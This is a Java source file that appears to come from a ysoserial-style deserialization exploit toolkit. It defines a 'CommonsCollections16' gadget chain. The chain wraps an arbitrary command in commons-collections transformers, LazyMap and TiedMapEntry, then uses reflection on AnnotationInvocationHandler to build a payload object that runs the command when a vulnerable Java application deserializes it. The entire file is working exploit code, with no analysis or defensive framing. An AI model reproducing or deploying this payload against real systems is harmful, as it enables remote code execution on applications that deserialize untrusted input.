package com.qi4l.JYso.gadgets;


import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1","jdk:jdk<=8u70"})
@Authors({Authors.Unam4})
public class CommonsCollections16 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map decorate = LazyMap.decorate(new HashMap(), new ConstantFactory(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,1);
        HashMap<Object, Object> map1 = new HashMap<>();
        map1.put("value",tiedMapEntry);
        Class<?> AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        Anotationdeclared.setAccessible(true);
        InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Target.class, map1);
        Reflections.setFieldValue(decorate, "factory",transformerChain );
        Reflections.setFieldValue(tiedMapEntry, "key",233);
        return h;
    }
}